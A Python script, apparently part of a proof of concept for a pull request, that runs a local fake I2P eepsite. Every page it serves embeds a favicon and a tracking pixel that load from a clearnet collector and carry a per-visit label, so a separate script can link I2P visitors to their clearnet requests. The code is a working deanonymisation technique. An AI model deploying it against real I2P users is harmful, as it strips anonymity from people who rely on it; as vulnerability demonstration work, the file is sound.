#!/usr/bin/env python3
"""I2P eepsite simulator for the PR #314 linkability PoC.

Its logical address is http://linkability-demo.i2p/<path>. Every render
mints a fresh per-visit label and embeds two cross-network sub-resources
(a favicon and a 1x1 pixel) that point at the clearnet collector, carrying
that label in the query string. A real browser pointed at the I2P HTTP
proxy auto-loads these the instant the page parses -- with no user click.

The eepsite logs, per render, the label it minted and the page it was on.
That log is the "I2P-side observation". The collector log is the
"clearnet-side observation". correlate.py joins the two by label.

Run:  python3 eepsite.py --port 8631 --collector http://127.0.0.1:8632 \
                         --log logs/eepsite_log.jsonl
"""
import argparse
import html
import json
import os
import sys
import time
import uuid
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

LOGFILE = None
COLLECTOR = None            # real URL the sub-resources point at
EEPSITE_HOST = "linkability-demo.i2p"

PAGE = """<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>{title}</title>
<!-- cross-network sub-resource #1: favicon, auto-loaded by the browser -->
<link rel="icon" href="{coll}/favicon.ico?sid={label}">
</head>
<body>
<h1>{title}</h1>
<p>You are reading an I2P eepsite. While you read it, your browser is
silently loading a resource hosted on the public internet. You did not
click anything.</p>
<!-- cross-network sub-resource #2: tracking pixel, auto-loaded -->
<img src="{coll}/px.gif?sid={label}" width="1" height="1" alt="">
<!-- per-visit correlation label (server-side secret key): {label} -->
</body>
</html>
"""


class Handler(BaseHTTPRequestHandler):
    server_version = "eepsite/1.0"

    def do_GET(self):
        if self.path.startswith("/favicon.ico"):
            self.send_response(204)
            self.end_headers()
            return

        label = uuid.uuid4().hex
        rec = {
            "event": "i2p_pageview",
            "ts": round(time.time(), 3),
            "eepsite_host": EEPSITE_HOST,
            "path": self.path,
            "label": label,
            "sec_fetch_mode": self.headers.get("Sec-Fetch-Mode"),
            "sec_fetch_dest": self.headers.get("Sec-Fetch-Dest"),
        }
        with open(LOGFILE, "a") as fh:
            fh.write(json.dumps(rec) + "\n")
        sys.stderr.write("[eepsite]  pageview  path=%s  label=%s\n"
                         % (self.path, label))

        title = EEPSITE_HOST + self.path
        body = PAGE.format(
            title=html.escape(title), coll=COLLECTOR, label=label
        ).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass


def main():
    global LOGFILE, COLLECTOR
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=8631)
    ap.add_argument("--collector", default="http://127.0.0.1:8632")
    ap.add_argument("--log", default="logs/eepsite_log.jsonl")
    args = ap.parse_args()
    LOGFILE = args.log
    COLLECTOR = args.collector.rstrip("/")
    os.makedirs(os.path.dirname(LOGFILE) or ".", exist_ok=True)
    httpd = ThreadingHTTPServer(("127.0.0.1", args.port), Handler)
    sys.stderr.write(
        "[eepsite]  http://%s  (served on 127.0.0.1:%d)  ->  %s\n"
        % (EEPSITE_HOST, args.port, LOGFILE)
    )
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
